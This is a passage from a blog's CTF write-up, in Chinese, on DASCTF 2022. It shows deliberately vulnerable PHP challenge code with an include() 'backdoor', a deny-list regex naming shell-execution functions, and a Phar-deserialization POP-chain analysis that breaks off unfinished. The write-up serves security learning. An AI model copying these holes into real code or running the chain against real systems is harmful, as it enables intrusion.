@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>DASCTF2022七月赛 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="DASCTF2022七月赛">
+  <meta property="og:description" content="Ez to getflag （Phar反序列化&#43;条件竞争） phar 发序列化
+出现非预期了
+预期： 扒下来源码，直接读文件就行，不需要目录穿越
+file.php
+&lt;?php error_reporting(0); session_start(); require_once(&#39;class.php&#39;); $filename = $_GET[&#39;f&#39;]; $show = new Show($filename); $show-&gt;show(); ?&gt; class.php，是主要源码
+&lt;?php class Upload { public $f; public $fname; public $fsize; function __construct(){ $this-&gt;f = $_FILES; } function savefile() { $fname = md5($this-&gt;f[&#34;file&#34;][&#34;name&#34;]).&#34;.png&#34;; if(file_exists(&#39;./upload/&#39;.$fname)) { @unlink(&#39;./upload/&#39;.$fname); } move_uploaded_file($this-&gt;f[&#34;file&#34;][&#34;tmp_name&#34;],&#34;upload/&#34; . $fname); echo &#34;upload success! :D&#34;; } function __toString(){ $cont = $this-&gt;fname; $size = $this-&gt;fsize; echo $cont-&gt;$size; return &#39;this_is_upload&#39;; } function uploadfile() { if($this-&gt;file_check()) { $this-&gt;savefile(); } } function file_check() { $allowed_types = array(&#34;png&#34;); $temp = explode(&#34;.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:51:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:51:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="DASCTF2022七月赛">
+  <meta name="twitter:description" content="Ez to getflag （Phar反序列化&#43;条件竞争） phar 发序列化
+出现非预期了
+预期： 扒下来源码，直接读文件就行，不需要目录穿越
+file.php
+&lt;?php error_reporting(0); session_start(); require_once(&#39;class.php&#39;); $filename = $_GET[&#39;f&#39;]; $show = new Show($filename); $show-&gt;show(); ?&gt; class.php，是主要源码
+&lt;?php class Upload { public $f; public $fname; public $fsize; function __construct(){ $this-&gt;f = $_FILES; } function savefile() { $fname = md5($this-&gt;f[&#34;file&#34;][&#34;name&#34;]).&#34;.png&#34;; if(file_exists(&#39;./upload/&#39;.$fname)) { @unlink(&#39;./upload/&#39;.$fname); } move_uploaded_file($this-&gt;f[&#34;file&#34;][&#34;tmp_name&#34;],&#34;upload/&#34; . $fname); echo &#34;upload success! :D&#34;; } function __toString(){ $cont = $this-&gt;fname; $size = $this-&gt;fsize; echo $cont-&gt;$size; return &#39;this_is_upload&#39;; } function uploadfile() { if($this-&gt;file_check()) { $this-&gt;savefile(); } } function file_check() { $allowed_types = array(&#34;png&#34;); $temp = explode(&#34;.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/" /><link rel="prev" href="https://thnpkm.github.io/posts/ctf/dasctf2022%E4%B9%9D%E6%9C%88%E8%B5%9B/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/dasctf-7%E6%9C%88/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DASCTF2022七月赛",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B\/"
+        },"genre": "posts","keywords": "","wordcount":  499 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B\/","datePublished": "2024-08-20T23:51:36+08:00","dateModified": "2024-08-20T23:51:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DASCTF2022七月赛</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;499 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ez-to-getflag-phar反序列化条件竞争">Ez to getflag （Phar反序列化+条件竞争）</a></li>
+    <li><a href="#harddiskssti盲注以及bypass">Harddisk（SSTI盲注以及bypass）</a></li>
+    <li><a href="#绝对防御-js接口sql盲注">绝对防御 （JS接口+sql盲注）</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="ez-to-getflag-phar反序列化条件竞争">Ez to getflag （Phar反序列化+条件竞争）</h2>
+<blockquote>
+<p>phar 发序列化</p>
+</blockquote>
+<p>出现非预期了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041503302.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041503302.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041503302.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041503302.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041503302.png"
+        title="image-20221104150331163" /></p>
+<p>预期： 扒下来源码，直接读文件就行，不需要目录穿越</p>
+<p>file.php</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;class.php&#39;</span>); 
+</span></span><span style="display:flex;"><span>    $filename <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;f&#39;</span>];
+</span></span><span style="display:flex;"><span>    $show <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Show</span>($filename);
+</span></span><span style="display:flex;"><span>    $show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>class.php，是主要源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Upload</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $f;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $fname;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $fsize;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __construct(){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> $_FILES;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">savefile</span>() {  
+</span></span><span style="display:flex;"><span>            $fname <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">f</span>[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.png&#34;</span>; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>(<span style="color:#e6db74">&#39;./upload/&#39;</span><span style="color:#f92672">.</span>$fname)) { 
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>(<span style="color:#e6db74">&#39;./upload/&#39;</span><span style="color:#f92672">.</span>$fname);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">move_uploaded_file</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">f</span>[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>],<span style="color:#e6db74">&#34;upload/&#34;</span> <span style="color:#f92672">.</span> $fname); 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;upload success! :D&#34;</span>; 
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __toString(){
+</span></span><span style="display:flex;"><span>            $cont <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fname</span>;
+</span></span><span style="display:flex;"><span>            $size <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fsize</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $cont<span style="color:#f92672">-&gt;</span>$size;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;this_is_upload&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">uploadfile</span>() { 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_check</span>()) { 
+</span></span><span style="display:flex;"><span>                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">savefile</span>(); 
+</span></span><span style="display:flex;"><span>            } 
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">file_check</span>() { 
+</span></span><span style="display:flex;"><span>            $allowed_types <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;png&#34;</span>);
+</span></span><span style="display:flex;"><span>            $temp <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">f</span>[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]);
+</span></span><span style="display:flex;"><span>            $extension <span style="color:#f92672">=</span> <span style="color:#a6e22e">end</span>($temp); 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($extension)) { 
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;what are you uploaded? :0&#34;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>{ 
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($extension,$allowed_types)) {
+</span></span><span style="display:flex;"><span>                    $filter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&lt;\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i&#39;</span>;
+</span></span><span style="display:flex;"><span>                    $f <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">f</span>[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>]);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match_all</span>($filter,$f)){
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;what are you doing!! :C&#39;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>; 
+</span></span><span style="display:flex;"><span>                } 
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> { 
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;png onlyyy! XP&#39;</span>; 
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>; 
+</span></span><span style="display:flex;"><span>                } 
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Show</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $source;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($fname)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> $fname;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show</span>()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/http|https|file:|php:|gopher|dict|\.\./i&#39;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;illegal fname :P&#39;</span>);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>);
+</span></span><span style="display:flex;"><span>                $src <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;data:jpg;base64,&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>));
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;img src=</span><span style="color:#e6db74">{</span>$src<span style="color:#e6db74">}</span><span style="color:#e6db74"> /&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __get($name)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ok</span>($name);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __call($name, $arguments)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">end</span>($arguments)<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;phpinfo&#39;</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">phpinfo</span>();
+</span></span><span style="display:flex;"><span>            }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">backdoor</span>(<span style="color:#a6e22e">end</span>($arguments));
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> $name;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">backdoor</span>($door){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">include</span>($door);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;hacked!!&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;illegal fname XD&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $str;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;It&#39;s works&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>找危险函数，<code>Show类</code>有个<code>backdoor方法</code>里有<code>include()函数</code>可以造成文件包含</p>
+<p>审计一下 ，</p>
+<p>看看逻辑，<code>show类</code>这里的过滤没有过滤phar协议，配合文件上传的功能可以进行phar文件反序列化</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/http|https|file:|php:|gopher|dict|\.\./i&#39;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;illegal fname :P&#39;</span>);
+</span></span></code></pre></div><p><code>file_check()</code>上传文件必须为<code>png</code>，文件内容也有很大限制,不能出现一下内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$filter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&lt;\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i&#39;</span>;
+</span></span></code></pre></div><p>所以传php马不太行，但可以利用phar文件在被一些压缩方式压缩后依然可以使用phar协议进行解析的特性，传一个压缩过后的phar文件进去</p>
+<p>构造一下pop链：</p>
+<p><code>Tset类 __destruct</code>进入，有echo可以触发<code>User类 __toString</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#66d9ef">function</span> __toString(){
+</span></span><span style="display:flex;"><span>            $cont <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fname</span>;
+</span></span><span style="display:flex;"><span>            $size <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fsize</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $cont<span style="color:#f92672">-&gt;</span>$size;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;this_is_upload&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>重点是这里怎么走，这里有个逻辑<code>$cont-&gt;$size</code> 令<code>$cont</code>为<code>Show类</code> 则可以触发<code>Show类__get</code></p>
+<pre tabindex="0"><code>__get():当我们试图获取一个不可达属性时(比如private)或不存在，则类会自动调用__get函数
+__call():着调用一个对象中不存在或被权限控制中的方法，__call 方法将会被自动调用。
+</code></pre><p>这里的$size也是我们可以控制的，Show类里找不到$size这个属性，就会触发__get</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#66d9ef">function</span> __get($name)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ok</span>($name);
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>这个<code>__get</code>() 还是有参数的<code>$name</code>, 搞得挺烦人，但是<code>$name</code>其实就是刚调用的不可达属性<code>$size</code></p>
+<p>继续走，<code> $this-&gt;ok($name);</code>调用了不可达的方法<code>ok()</code>，所以触发了<code>__call</code>，来看看__call</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __call($name, $arguments)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">end</span>($arguments)<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;phpinfo&#39;</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">phpinfo</span>();
+</span></span><span style="display:flex;"><span>            }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">backdoor</span>(<span style="color:#a6e22e">end</span>($arguments));
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> $name;
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>也是好烦，里面怎么有两个参数($name, $arguments)，解释一下。</p>
